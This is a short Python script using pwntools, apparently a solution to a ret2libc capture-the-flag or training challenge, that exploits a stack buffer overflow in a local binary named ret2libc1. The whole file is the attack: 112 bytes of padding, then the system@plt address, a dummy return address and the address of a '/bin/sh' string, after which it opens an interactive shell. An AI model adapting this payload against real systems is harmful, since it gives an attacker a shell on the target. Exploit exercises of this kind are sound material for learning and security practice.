from pwn import *

p = process('./ret2libc1')

binsh_addr = 0x08048720
plt_system = 0x08048460
system_ret = b'AAAA'

payload = flat([b'A' * 112, plt_system, system_ret, binsh_addr])

p.sendline(payload)
p.interactive()